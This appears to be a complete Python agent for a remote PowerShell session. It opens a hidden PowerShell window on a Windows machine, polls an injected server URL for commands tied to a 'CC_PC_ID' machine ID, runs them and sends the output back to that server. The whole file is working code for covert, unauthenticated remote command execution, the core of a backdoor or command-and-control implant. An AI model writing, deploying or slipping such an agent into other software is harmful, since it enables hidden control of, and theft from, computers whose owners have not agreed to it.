# -*- coding: utf-8 -*-
"""
Remote Shell - PowerShell terminal session
Persistent PowerShell session that maintains state between commands
"""
import os
import sys
import subprocess
import json
import time
import urllib.request
import urllib.error
import signal
import threading
import re

# Fix stdout encoding for Windows
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except:
        pass

# SERVER_URL will be injected by the server when sending the script
# If not injected, this script will fail - server should always inject it
try:
    SERVER_URL
except NameError:
    print("ERROR: SERVER_URL not set. Server should inject this variable.")
    sys.exit(1)
PC_ID = os.environ.get("CC_PC_ID", "unknown")

# Global flag to control the loop
running = True
powershell_process = None
output_thread = None
current_command_id = None
command_output_buffer = []
output_lock = threading.Lock()

# Signal handler for graceful shutdown
def signal_handler(signum, frame):
    global running
    print("\n[*] Received shutdown signal, stopping...")
    running = False
    if powershell_process:
        try:
            powershell_process.terminate()
        except:
            pass

# Register signal handlers
if sys.platform != 'win32':
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def safe_str(s):
    """Convert string to ASCII-safe version"""
    if s is None:
        return ""
    try:
        if isinstance(s, bytes):
            s = s.decode('utf-8', errors='replace')
        return s.encode('ascii', 'replace').decode('ascii')
    except:
        return "???"


def send_output(output_data):
    """Send command output to server."""
    try:
        data = json.dumps(output_data).encode('utf-8')
        
        req = urllib.request.Request(
            f"{SERVER_URL}/remote/shell/output",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=5) as response:
            result = json.loads(response.read().decode('utf-8'))
            return result.get("received", False)
    except:
        return False


def send_log(message, level="INFO"):
    """Send log message to server."""
    try:
        log_data = {
            "pc_id": PC_ID,
            "message": message,
            "level": level,
            "timestamp": time.time()
        }
        data = json.dumps(log_data).encode('utf-8')
        
        req = urllib.request.Request(
            f"{SERVER_URL}/logs",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=3) as response:
            return True
    except:
        return False


def check_for_commands():
    """Poll server for new commands to execute."""
    try:
        req = urllib.request.Request(f"{SERVER_URL}/remote/shell/command/{PC_ID}")
        with urllib.request.urlopen(req, timeout=1) as response:
            result = json.loads(response.read().decode('utf-8'))
            return result
    except urllib.error.HTTPError as e:
        if e.code == 404:
            return None
        return None
    except:
        return None


def check_if_should_stop():
    """Check if server wants us to stop."""
    try:
        req = urllib.request.Request(f"{SERVER_URL}/remote/shell/status/{PC_ID}")
        with urllib.request.urlopen(req, timeout=2) as response:
            result = json.loads(response.read().decode('utf-8'))
            is_active = result.get("active", False)
            return not is_active
    except:
        return False


def is_powershell_prompt(line):
    """Check if line is a PowerShell prompt."""
    if not line:
        return False
    # PowerShell prompts: PS C:\Users\user>, PS>, PS C:\>, etc.
    # Also handle cases with spaces and different formats
    line_stripped = line.strip()
    patterns = [
        r'^PS\s+[A-Z]:\\.*>',  # PS C:\Users\user>
        r'^PS\s+[A-Z]:>',       # PS C:>
        r'^PS\s*>',             # PS>
        r'^PS>',                 # PS> (no space)
        r'^PS\s+[A-Z]:\\.*\s*>',  # PS C:\Users\user >
    ]
    for pattern in patterns:
        if re.match(pattern, line_stripped, re.IGNORECASE):
            return True
    return False


def read_powershell_output():
    """Thread function to continuously read output from PowerShell."""
    global command_output_buffer, current_command_id
    
    last_prompt_time = time.time()
    prompt_detected = False
    
    try:
        while running and powershell_process and powershell_process.poll() is None:
            try:
                line = powershell_process.stdout.readline()
                if not line:
                    # Process might have ended or pipe closed
                    if powershell_process.poll() is not None:
                        break
                    time.sleep(0.05)
                    continue
                
                line = line.rstrip('\n\r')
                
                # Check if this is a PowerShell prompt (indicates command completed)
                is_prompt = is_powershell_prompt(line)
                
                with output_lock:
                    if is_prompt:
                        prompt_detected = True
                        last_prompt_time = time.time()
                        
                        # Command completed, send accumulated output
                        if current_command_id:
                            output_text = "\n".join(command_output_buffer) if command_output_buffer else ""
                            # Always send output, even if empty (command might produce no output)
                            if output_text:
                                output_text += "\n"
                            else:
                                output_text = "\n"  # At least send a newline
                            
                            send_output({
                                "pc_id": PC_ID,
                                "command_id": current_command_id,
                                "type": "stdout",
                                "output": output_text,
                                "timestamp": time.time(),
                                "return_code": 0
                            })
                            
                            # Clear buffer and command ID
                            command_output_buffer = []
                            current_command_id = None
                    else:
                        # Regular output line, add to buffer
                        # Filter out control characters that might interfere
                        if line:
                            # Remove any control characters except newlines/tabs
                            cleaned_line = ''.join(c for c in line if ord(c) >= 32 or c in '\t')
                            if cleaned_line:  # Only add non-empty lines to avoid clutter
                                command_output_buffer.append(cleaned_line)
                        prompt_detected = False
                        
            except Exception as e:
                print(f"[!] Error reading PowerShell output: {safe_str(str(e))}")
                time.sleep(0.1)
    except:
        pass


def start_powershell():
    """Start persistent PowerShell process."""
    global powershell_process, output_thread
    
    try:
        # Get user's home directory
        home_dir = os.path.expanduser("~")
        if not os.path.exists(home_dir):
            home_dir = os.getcwd()
        
        # Start PowerShell in interactive mode
        # Use -NoExit to keep it running, -Command with empty command to start interactive
        powershell_process = subprocess.Popen(
            ["powershell.exe", "-NoProfile", "-NoExit", "-Command", "-"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Merge stderr into stdout
            text=True,
            encoding='utf-8',
            errors='replace',
            cwd=home_dir,
            bufsize=1,  # Line buffered
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        
        # Start output reading thread
        output_thread = threading.Thread(target=read_powershell_output, daemon=True)
        output_thread.start()
        
        # Wait a bit for PowerShell to initialize
        time.sleep(0.8)
        
        # Read initial prompt (PowerShell startup messages)
        # On Windows, readline() will block, so we use a timeout approach
        initial_output = []
        start_time = time.time()
        timeout = 3
        
        while time.time() - start_time < timeout:
            if powershell_process.poll() is not None:
                return False
            
            # Try to read available output (non-blocking on Windows is tricky)
            # Just wait for the thread to process initial output
            time.sleep(0.1)
            
            # Check if we have output in buffer (thread might have read it)
            with output_lock:
                if command_output_buffer:
                    # Check if any line is a prompt
                    for line in command_output_buffer:
                        if is_powershell_prompt(line):
                            # Found prompt, clear initial buffer
                            command_output_buffer.clear()
                            return True
        
        # If we get here, assume PowerShell started (might not have seen prompt yet)
        return True
        
    except Exception as e:
        print(f"[!] Failed to start PowerShell: {safe_str(str(e))}")
        return False


def execute_command_in_powershell(command, command_id):
    """Execute a command in the persistent PowerShell session."""
    global powershell_process, current_command_id, command_output_buffer
    
    if not powershell_process or not powershell_process.stdin:
        return False
    
    # Check if PowerShell process is still alive
    if powershell_process.poll() is not None:
        return False
    
    try:
        with output_lock:
            # Clear previous output buffer
            command_output_buffer = []
            current_command_id = command_id
        
        # Send command to PowerShell (ensure clean command without control characters)
        clean_command = command.strip()
        # Clear any pending input first
        try:
            powershell_process.stdin.flush()
        except:
            pass
        
        # Send the command
        powershell_process.stdin.write(clean_command + "\r\n")  # Use \r\n for Windows
        powershell_process.stdin.flush()
        
        # Wait for command to complete (output thread will detect prompt and send output)
        # Set a timeout - if no prompt appears within 10 seconds, assume command is hanging
        start_time = time.time()
        timeout = 10
        last_output_check = start_time
        
        while time.time() - start_time < timeout:
            # Check if command completed (output thread cleared current_command_id)
            with output_lock:
                if current_command_id is None:
                    # Command completed successfully
                    return True
                
                # Check if we're getting output (command is running)
                if command_output_buffer:
                    last_output_check = time.time()
            
            # Check if process died
            if powershell_process.poll() is not None:
                # Process died, send error
                error_msg = "[!] PowerShell process terminated unexpectedly\n"
                send_output({
                    "pc_id": PC_ID,
                    "command_id": command_id,
                    "type": "error",
                    "output": error_msg,
                    "timestamp": time.time()
                })
                with output_lock:
                    current_command_id = None
                    command_output_buffer = []
                return False
            
            # If we haven't seen output or completion in a while, check if command might be done
            # Sometimes prompt detection misses, so if no output for 2 seconds after command, assume done
            if time.time() - last_output_check > 2 and time.time() - start_time > 1:
                # No output for 2 seconds, might be done - check one more time
                with output_lock:
                    if current_command_id == command_id and not command_output_buffer:
                        # No output and still waiting - might be a command that produces no output
                        # Send empty output and mark as complete
                        send_output({
                            "pc_id": PC_ID,
                            "command_id": command_id,
                            "type": "stdout",
                            "output": "\n",
                            "timestamp": time.time(),
                            "return_code": 0
                        })
                        current_command_id = None
                        command_output_buffer = []
                        return True
            
            time.sleep(0.1)
        
        # Timeout - command is likely hanging or interactive
        with output_lock:
            if current_command_id == command_id:
                # Still waiting, command timed out
                timeout_msg = f"\n[!] Command timed out after {timeout}s. Command may be interactive or still running."
                
                # Send whatever output we have
                output_text = "\n".join(command_output_buffer) if command_output_buffer else ""
                output_text += timeout_msg + "\n"
                
                send_output({
                    "pc_id": PC_ID,
                    "command_id": command_id,
                    "type": "error",
                    "output": output_text,
                    "timestamp": time.time()
                })
                
                # Clear state - DO NOT send Ctrl+C as it interferes with next command
                command_output_buffer = []
                current_command_id = None
        
        return True
        
    except Exception as e:
        error_msg = f"[!] Error executing command: {safe_str(str(e))}\n"
        send_output({
            "pc_id": PC_ID,
            "command_id": command_id,
            "type": "error",
            "output": error_msg,
            "timestamp": time.time()
        })
        with output_lock:
            current_command_id = None
            command_output_buffer = []
        return False


def main_loop():
    """Main loop: maintain persistent PowerShell session and execute commands."""
    global running, powershell_process, output_thread
    
    print(f"[*] Starting PowerShell remote shell for PC: {PC_ID}")
    print(f"[*] Server: {SERVER_URL}")
    
    # Send log that session started
    send_log(f"Remote shell session started for {PC_ID}", "INFO")
    
    # Start persistent PowerShell
    if not start_powershell():
        send_log(f"Failed to start PowerShell for {PC_ID}", "ERROR")
        return
    
    print("[*] PowerShell terminal started")
    send_log(f"PowerShell terminal started for {PC_ID}", "INFO")
    
    # Send initial output to show PowerShell is ready
    send_output({
        "pc_id": PC_ID,
        "command_id": None,
        "type": "stdout",
        "output": "PowerShell Remote Shell Session Started\nReady for commands...\n",
        "timestamp": time.time()
    })
    
    last_command_id = None
    
    try:
        while running:
            try:
                # Check if server wants us to stop
                if check_if_should_stop():
                    print("[*] Server requested stop")
                    break
                
                # Check if PowerShell process is still alive
                if powershell_process and powershell_process.poll() is not None:
                    print("[!] PowerShell process died")
                    send_log(f"PowerShell process terminated for {PC_ID}", "WARNING")
                    break
                
                # Check for new commands
                command_data = check_for_commands()
                
                if command_data:
                    command = command_data.get("command")
                    command_id = command_data.get("command_id")
                    
                    # Only execute if it's a new command and we're not already executing one
                    with output_lock:
                        can_execute = (command_id and 
                                     command_id != last_command_id and 
                                     current_command_id is None)
                    
                    if can_execute:
                        last_command_id = command_id
                        print(f"[*] Executing command: {command}")
                        execute_command_in_powershell(command, command_id)
                
                # Sleep to avoid excessive polling
                time.sleep(0.3)  # Poll every 300ms
                
            except KeyboardInterrupt:
                raise
            except Exception as e:
                print(f"[!] Error in main loop: {safe_str(str(e))}")
                time.sleep(1)
    
    except KeyboardInterrupt:
        print("\n[*] Stopping remote shell...")
    finally:
        running = False
        
        # Send log that session ended
        send_log(f"Remote shell session ended for {PC_ID}", "INFO")
        
        if powershell_process:
            try:
                # Send exit command
                if powershell_process.stdin:
                    powershell_process.stdin.write("exit\n")
                    powershell_process.stdin.flush()
                    time.sleep(0.5)
                
                # Terminate if still running
                if powershell_process.poll() is None:
                    powershell_process.terminate()
                    try:
                        powershell_process.wait(timeout=1)
                    except:
                        powershell_process.kill()
            except:
                pass
        
        print("[*] Remote shell stopped")


def main():
    try:
        main_loop()
    except Exception as e:
        print(f"[FATAL ERROR] {safe_str(str(e))}")
        send_log(f"Fatal error in remote shell: {safe_str(str(e))}", "ERROR")
        sys.exit(1)


if __name__ == '__main__':
    main()
